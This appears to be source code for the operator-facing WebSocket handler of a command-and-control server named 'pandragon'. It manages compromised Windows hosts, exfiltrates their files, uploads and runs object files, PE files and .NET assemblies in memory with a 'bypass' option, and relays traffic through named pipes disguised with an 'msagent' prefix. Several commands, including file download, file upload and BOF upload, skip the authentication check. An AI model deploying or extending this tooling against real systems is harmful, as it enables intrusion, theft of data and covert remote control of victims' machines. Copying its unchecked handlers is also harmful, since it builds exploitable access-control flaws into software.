"""
Operator WebSocket Handler

Handles operator authentication and command dispatch over WebSocket.
"""

import json
import os
import time
import struct
import asyncio
import base64
import secrets
import logging
import aiofiles

from aiohttp import web, WSMsgType

from protocol.constants import S2BOpcode
from relay.relay_routing import get_relay_manager
from commands.execute_pe import handle_execute_pe, handle_execute_assembly


logger = logging.getLogger('pandragon.operator_ws')
IDLE_WS_TIMEOUT = 300


async def handle_operator_ws(request: web.Request) -> web.WebSocketResponse:
    """Handle operator WebSocket connection."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    ctx = request.app['ctx']

    operator_sockets = ctx.operator_sockets
    operator_sockets.add(ws)

    authenticated = False
    operator_session = None

    try:
        while True:
            try:
                msg = await asyncio.wait_for(ws.receive(), timeout=IDLE_WS_TIMEOUT)
            except asyncio.TimeoutError:
                logger.debug(f"Operator WebSocket idle timeout ({IDLE_WS_TIMEOUT}s)")
                break

            if msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                except json.JSONDecodeError:
                    await ws.send_json({'type': 'error', 'error': 'Invalid JSON'})
                    continue

                msg_type = data.get('type', '')
                req_id = data.get('id')

                async def _send(msg: dict):
                    if req_id is not None:
                        msg['id'] = req_id
                    await ws.send_json(msg)

                if msg_type == 'authenticate':
                    token = data.get('token')
                    username = data.get('username', 'operator')

                    if not token:
                        await _send({'type': 'authenticated', 'success': False, 'error': 'No token provided'})
                        continue

                    op = ctx.operator_manager.authenticate(token)
                    if op:
                        op.sid = secrets.token_hex(16)
                        op.username = username
                        ctx.operator_manager.attach_session(op.operator_id, op.sid)
                        operator_session = op
                        authenticated = True

                        await _send({
                            'type': 'authenticated',
                            'success': True,
                            'operator_id': op.operator_id,
                            'username': op.username
                        })

                        await ctx.broadcast_except('operator_joined', {
                            'operator_id': op.operator_id,
                            'username': op.username
                        }, ws)

                        logger.info(f"Operator authenticated: {op.username}")
                        ctx.audit_logger.log_operator_login(op.username, request.remote, True)
                    else:
                        await _send({'type': 'authenticated', 'success': False, 'error': 'Invalid token'})
                        ctx.audit_logger.log_operator_login('unknown', request.remote, False)

                elif msg_type == 'list_beacons':
                    beacons = ctx.beacon_registry.list_beacons()
                    now = time.time()
                    await _send({
                        'type': 'beacon_list',
                        'beacons': [{
                            'beacon_id': b.beacon_id,
                            'name': b.name or '',
                            'status': 'active' if (now - b.last_seen) < 30 else 'idle' if (now - b.last_seen) < 300 else 'offline',
                            'last_seen': b.last_seen,
                            'last_seen_ago': int(now - b.last_seen),
                            'authenticated': b.authenticated,
                            'queued_tasks_internal': len(b.task_queue),
                            'scheduled_tasks': 0,
                            'pending_tasks': 0,
                            'output_count': len(b.output_log),
                            'key_rotation_pending': b.key_rotation_pending,
                            'username': b.username or '',
                            'computer_name': b.computer_name or '',
                            'domain': b.domain or '',
                            'os_major': b.os_major,
                            'os_minor': b.os_minor,
                            'os_build': b.os_build,
                            'arch': b.arch,
                            'process_name': b.process_name or '',
                            'pid': b.pid,
                            'internal_ips': b.internal_ips,
                        } for b in beacons]
                    })

                elif msg_type == 'list_operators':
                    operators = ctx.operator_manager.list_operators()
                    await _send({
                        'type': 'operator_list',
                        'operators': [{
                            'operator_id': o.operator_id,
                            'username': o.username,
                            'connected': o.sid is not None,
                            'commands_issued': o.commands_issued,
                            'last_activity_ago': int(time.time() - o.last_activity)
                        } for o in operators]
                    })

                elif msg_type == 'register_beacon':
                    if not authenticated:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Not authenticated'})
                        continue

                    beacon_id = data.get('beacon_id', '')
                    crypto_key = data.get('crypto_key', '')
                    allowed_routes = data.get('allowed_routes', [])

                    if not beacon_id or not crypto_key or not allowed_routes:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Missing required fields: beacon_id, crypto_key, allowed_routes'})
                        continue

                    try:
                        new_paths = ctx.beacon_registry.register_remote(beacon_id, crypto_key, allowed_routes)
                        if new_paths:
                            ctx.add_beacon_routes(new_paths)
                        await _send({
                            'type': 'command_result',
                            'success': True,
                            'message': f'Beacon {beacon_id[:16]} registered with {len(allowed_routes)} route(s)',
                            'beacon_id': beacon_id,
                        })
                        logger.info(f"Remote beacon registration via WS: {beacon_id}")
                    except Exception as e:
                        await _send({'type': 'command_result', 'success': False, 'error': str(e)})

                elif msg_type == 'command':
                    beacon_id = data.get('beacon_id')
                    command = data.get('command', '')
                    opcode = data.get('opcode')
                    payload_hex = data.get('payload', '')

                    op = operator_session
                    if not op:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Not authenticated'})
                        continue

                    beacon_obj = ctx.beacon_registry.get(beacon_id)
                    if not beacon_obj:
                        await _send({'type': 'command_result', 'success': False, 'error': f'Beacon {beacon_id} not found'})
                        continue

                    bpayload = bytes.fromhex(payload_hex) if payload_hex else b''

                    task_id = await ctx.task_queue.add_task(
                        beacon_id=beacon_id,
                        opcode=opcode,
                        payload=bpayload,
                        operator_id=op.username if op else None,
                        description=command
                    )
                    logger.info(f"WebSocket command queued: {command} -> {beacon_id} (task_id: {task_id})")

                    ctx.audit_logger.log_command(beacon_id, op.username, command)

                    await _send({
                        'type': 'command_issued',
                        'cmd_id': task_id or 'unknown',
                        'operator_name': op.username,
                        'beacon_id': beacon_id,
                        'command': command,
                        'task_id': task_id
                    })

                    await _send({
                        'type': 'command_result',
                        'success': True,
                        'cmd_id': task_id or 'unknown',
                        'task_id': task_id,
                        'message': f'Command queued for {beacon_id}'
                    })

                elif msg_type == 'get_output':
                    beacon_id = data.get('beacon_id')
                    limit = data.get('limit', 100)
                    beacon_obj = ctx.beacon_registry.get(beacon_id)
                    if not beacon_obj:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Beacon not found'})
                    else:
                        await _send({
                            'type': 'beacon_output_log',
                            'beacon_id': beacon_id,
                            'output': beacon_obj.output_log[-limit:]
                        })

                elif msg_type == 'remove_beacon':
                    beacon_id = data.get('beacon_id')
                    await ctx.beacon_registry.remove(beacon_id)
                    await _send({
                        'type': 'command_result',
                        'success': True,
                        'message': f'Beacon {beacon_id} removed'
                    })
                    await ctx.broadcast('beacon_removed', {'beacon_id': beacon_id})

                elif msg_type == 'file_download':
                    beacon_id = data.get('beacon_id')
                    remote_path = data.get('path', '')
                    chunk_size = data.get('chunk_size', 4096)
                    local_save_path = data.get('local_save_path')

                    beacon_obj = ctx.beacon_registry.get(beacon_id)
                    if not beacon_obj:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Beacon not found'})
                        continue

                    transfer_id = ctx.file_transfer_manager.start_download(beacon_id, remote_path, chunk_size, local_save_path)

                    path_wide = remote_path.encode('utf-16-le')
                    payload_data = struct.pack('<HI', len(path_wide) // 2, chunk_size) + path_wide
                    await beacon_obj.queue_task(S2BOpcode.FILE_DOWNLOAD_START, payload_data)

                    await _send({
                        'type': 'command_result',
                        'success': True,
                        'transfer_id': transfer_id,
                        'message': 'FILE_DOWNLOAD_START queued'
                    })
                    logger.info(f"FILE_DOWNLOAD_START queued: {remote_path} -> {beacon_id} (transfer: {transfer_id})")

                elif msg_type == 'file_upload':
                    beacon_id = data.get('beacon_id')
                    local_path = data.get('local_path', '')
                    remote_path = data.get('remote_path', '')
                    chunk_size = data.get('chunk_size', 4096)

                    beacon_obj = ctx.beacon_registry.get(beacon_id)
                    if not beacon_obj:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Beacon not found'})
                        continue

                    try:
                        async with aiofiles.open(local_path, 'rb') as f:
                            file_data = await f.read()
                    except FileNotFoundError:
                        await _send({'type': 'command_result', 'success': False, 'error': f'File not found: {local_path}'})
                        continue

                    transfer_id = ctx.file_transfer_manager.start_upload(beacon_id, remote_path, file_data, chunk_size)

                    path_wide = remote_path.encode('utf-16-le')
                    payload_data = struct.pack('<HII', len(path_wide) // 2, len(file_data), chunk_size) + path_wide
                    await beacon_obj.queue_task(S2BOpcode.FILE_UPLOAD_START, payload_data)

                    result = ctx.file_transfer_manager.get_upload_chunk(transfer_id, 0)
                    if result[0] is not None:
                        tid, offset, chunk, is_last = result
                        chunk_payload = struct.pack('<III', 0, offset, len(chunk)) + bytes([1 if is_last else 0]) + chunk
                        await beacon_obj.queue_task(S2BOpcode.FILE_UPLOAD_CHUNK, chunk_payload)

                    await _send({
                        'type': 'command_result',
                        'success': True,
                        'transfer_id': transfer_id,
                        'message': f'FILE_UPLOAD_START queued ({len(file_data)} bytes)'
                    })
                    logger.info(f"FILE_UPLOAD_START queued: {local_path} -> {beacon_id}:{remote_path} (transfer: {transfer_id})")

                elif msg_type == 'file_transfer_status':
                    transfer_id = data.get('transfer_id', '')
                    status_data = ctx.file_transfer_manager.get_transfer_status(transfer_id)
                    if status_data:
                        await _send({'type': 'file_transfer_status_result', **status_data})
                    else:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Transfer not found'})

                elif msg_type == 'get_beacon':
                    beacon_id = data.get('beacon_id', '')
                    b = ctx.beacon_registry.get(beacon_id)
                    if b:
                        await _send({
                            'type': 'beacon_data',
                            'beacon_id': b.beacon_id,
                            'name': b.name or '',
                            'username': b.username,
                            'computer_name': b.computer_name,
                            'domain': b.domain,
                            'os_major': b.os_major,
                            'os_minor': b.os_minor,
                            'os_build': b.os_build,
                            'arch': b.arch,
                            'is_wow64': b.is_wow64,
                            'is_elevated': b.is_elevated,
                            'is_domain_joined': b.is_domain_joined,
                            'pid': b.pid,
                            'process_name': b.process_name,
                            'ram_mb': b.ram_mb,
                            'cpu_cores': b.cpu_cores,
                            'internal_ips': b.internal_ips,
                            'key_rotation_pending': b.key_rotation_pending,
                        })
                    else:
                        await _send({'type': 'beacon_data', 'beacon_id': beacon_id, 'error': 'Not found'})

                elif msg_type == 'rotate_key':
                    beacon_id = data.get('beacon_id', '')
                    b = ctx.beacon_registry.get(beacon_id)
                    if not b:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Beacon not found'})
                        continue
                    from protocol.payload_builder import _build_rotate_key
                    await b.queue_task(S2BOpcode.ROTATE_KEY, _build_rotate_key(b.crypto_key))
                    b.key_rotation_pending = True
                    await _send({'type': 'command_result', 'success': True, 'message': 'Key rotation queued'})

                elif msg_type == 'rename_beacon':
                    beacon_id = data.get('beacon_id', '')
                    name = data.get('name', '')
                    b = ctx.beacon_registry.get(beacon_id)
                    if b:
                        b.name = name
                        await _send({'type': 'rename_result', 'success': True, 'name': name})
                    else:
                        await _send({'type': 'rename_result', 'success': False, 'error': 'Beacon not found'})

                elif msg_type == 'list_bofs':
                    bof_dir = ctx.config.get('beacon', {}).get('bof_directory', 'bofs')
                    bofs = []
                    try:
                        for fname in os.listdir(bof_dir):
                            if fname.endswith('.o'):
                                fpath = os.path.join(bof_dir, fname)
                                stat_info = os.stat(fpath)
                                bofs.append({
                                    'filename': fname,
                                    'size': stat_info.st_size,
                                    'modified': stat_info.st_mtime,
                                })
                    except FileNotFoundError:
                        pass
                    bofs.sort(key=lambda x: x['filename'])
                    await _send({'type': 'bof_list', 'bofs': bofs})

                elif msg_type == 'upload_bof':
                    filename = data.get('filename', '')
                    file_data_b64 = data.get('data', '')
                    try:
                        file_bytes = base64.b64decode(file_data_b64)
                        bof_dir = ctx.config.get('beacon', {}).get('bof_directory', 'bofs')
                        os.makedirs(bof_dir, exist_ok=True)
                        fpath = os.path.join(bof_dir, os.path.basename(filename))
                        with open(fpath, 'wb') as f:
                            f.write(file_bytes)
                        await _send({'type': 'bof_upload_result', 'success': True, 'filename': filename})
                    except Exception as e:
                        await _send({'type': 'bof_upload_result', 'success': False, 'error': str(e)})

                elif msg_type == 'delete_bof':
                    filename = data.get('filename', '')
                    bof_dir = ctx.config.get('beacon', {}).get('bof_directory', 'bofs')
                    fpath = os.path.join(bof_dir, os.path.basename(filename))
                    try:
                        if os.path.exists(fpath):
                            os.remove(fpath)
                            await _send({'type': 'bof_delete_result', 'success': True})
                        else:
                            await _send({'type': 'bof_delete_result', 'success': False, 'error': 'BOF not found'})
                    except Exception as e:
                        await _send({'type': 'bof_delete_result', 'success': False, 'error': str(e)})

                elif msg_type == 'list_async_bofs':
                    beacon_id = data.get('beacon_id', '')
                    b = ctx.beacon_registry.get(beacon_id)
                    if b:
                        await _send({
                            'type': 'async_bof_list',
                            'beacon_id': beacon_id,
                            'async_bofs': b.long_running_bofs,
                        })
                    else:
                        await _send({'type': 'async_bof_list', 'beacon_id': beacon_id, 'async_bofs': []})

                elif msg_type == 'abort_async_bof':
                    beacon_id = data.get('beacon_id', '')
                    task_id = data.get('task_id')
                    b = ctx.beacon_registry.get(beacon_id)
                    if b and task_id is not None:
                        payload = struct.pack('<II', task_id, 1)
                        await b.queue_task(S2BOpcode.BOF_EXEC, payload)
                        await _send({'type': 'command_result', 'success': True, 'status': 'abort_sent'})
                    else:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Beacon not found'})

                elif msg_type == 'get_relay_graph':
                    graph = get_relay_manager().get_relay_graph()
                    await _send({
                        'type': 'relay_graph',
                        **graph,
                    })

                elif msg_type == 'relay_enable':
                    beacon_id = data.get('beacon_id', '')
                    pipe_prefix = data.get('pipe_name_prefix', 'msagent')
                    b = ctx.beacon_registry.get(beacon_id)
                    if not b:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Beacon not found'})
                        continue
                    from relay.relay_handler import build_start_relay_packet
                    await b.queue_task(S2BOpcode.START_RELAY, build_start_relay_packet())
                    logger.info(f"Relay enabled for {beacon_id}")
                    await _send({'type': 'command_result', 'success': True, 'message': f'Relay enabled for {beacon_id}'})

                elif msg_type == 'relay_disable':
                    beacon_id = data.get('beacon_id', '')
                    b = ctx.beacon_registry.get(beacon_id)
                    if not b:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Beacon not found'})
                        continue
                    from relay.relay_handler import build_stop_relay_packet
                    await b.queue_task(S2BOpcode.STOP_RELAY, build_stop_relay_packet())
                    logger.info(f"Relay disabled for {beacon_id}")
                    await _send({'type': 'command_result', 'success': True, 'message': f'Relay disabled for {beacon_id}'})

                elif msg_type == 'relay_add_child':
                    parent_id = data.get('parent_beacon_id', '')
                    child_id = data.get('child_beacon_id', '')
                    pipe_name = data.get('pipe_name', '')
                    parent_b = ctx.beacon_registry.get(parent_id)
                    child_b = ctx.beacon_registry.get(child_id)
                    if not parent_b or not child_b:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Parent or child beacon not found'})
                        continue
                    if not pipe_name:
                        from relay.relay_handler import generate_pipe_name
                        pipe_name = generate_pipe_name()
                    pipe_id = len(get_relay_manager().get_children(parent_id.encode())) + 1
                    from relay.relay_handler import build_relay_add_child_packet
                    await parent_b.queue_task(S2BOpcode.RELAY_ADD_CHILD, build_relay_add_child_packet(pipe_id, pipe_name))
                    get_relay_manager().add_relay_child(parent_id.encode(), child_id.encode(), pipe_id)
                    logger.info(f"Relay child added: {child_id} -> {parent_id} (pipe: {pipe_id})")
                    await _send({'type': 'command_result', 'success': True, 'message': f'Child added to relay'})

                elif msg_type == 'relay_remove_child':
                    parent_id = data.get('parent_beacon_id', '')
                    child_id = data.get('child_beacon_id', '')
                    b = ctx.beacon_registry.get(parent_id)
                    if not b:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Parent beacon not found'})
                        continue
                    parent_info = get_relay_manager().get_parent(child_id.encode())
                    if parent_info and parent_info[0] == parent_id.encode():
                        pipe_id = parent_info[1]
                        from relay.relay_handler import build_relay_remove_child_packet
                        await b.queue_task(S2BOpcode.RELAY_REMOVE_CHILD, build_relay_remove_child_packet(pipe_id))
                        get_relay_manager().remove_relay_child(parent_id.encode(), child_id.encode())
                        logger.info(f"Relay child removed: {child_id} from {parent_id}")
                        await _send({'type': 'command_result', 'success': True, 'message': f'Child removed from relay'})
                    else:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Route not found'})

                elif msg_type == 'execute_pe':
                    if not authenticated:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Not authenticated'})
                        continue
                    
                    beacon_id = data.get('beacon_id', '')
                    pe_data_b64 = data.get('pe_data', '')
                    pe_filename = data.get('pe_filename', 'unknown.exe')
                    cls = data.get('cls')
                    method = data.get('method')
                    params = data.get('params')
                    runtime = data.get('runtime', 'v4.0.30319')
                    arch = data.get('arch', 2)
                    bypass = data.get('bypass', 3)
                    
                    result = await handle_execute_pe(
                        ctx, beacon_id, pe_data_b64, pe_filename,
                        cls=cls, method=method, params=params,
                        runtime=runtime, arch=arch, bypass=bypass
                    )
                    
                    await _send({'type': 'command_result', **result})
                
                elif msg_type == 'execute_assembly':
                    if not authenticated:
                        await _send({'type': 'command_result', 'success': False, 'error': 'Not authenticated'})
                        continue
                    
                    beacon_id = data.get('beacon_id', '')
                    assembly_b64 = data.get('assembly_data', '')
                    assembly_name = data.get('assembly_name', 'unknown.exe')
                    cls = data.get('cls', '')
                    method = data.get('method', 'Main')
                    params = data.get('params')
                    runtime = data.get('runtime', 'v4.0.30319')
                    
                    if not cls:
                        await _send({'type': 'command_result', 'success': False, 'error': 'cls (class name) required for execute_assembly'})
                        continue
                    
                    result = await handle_execute_assembly(
                        ctx, beacon_id, assembly_b64, assembly_name,
                        cls=cls, method=method, params=params, runtime=runtime
                    )
                    
                    await _send({'type': 'command_result', **result})

            elif msg.type == WSMsgType.ERROR:
                logger.error(f"WebSocket error: {ws.exception()}")
                break

            elif msg.type == WSMsgType.CLOSE:
                break

            elif msg.type == WSMsgType.CLOSED:
                break

    finally:
        operator_sockets.discard(ws)
        if operator_session:
            ctx.operator_manager.detach_session(operator_session.sid)
            await ctx.broadcast('operator_left', {
                'operator_id': operator_session.operator_id,
                'reason': 'disconnected'
            })

    return ws
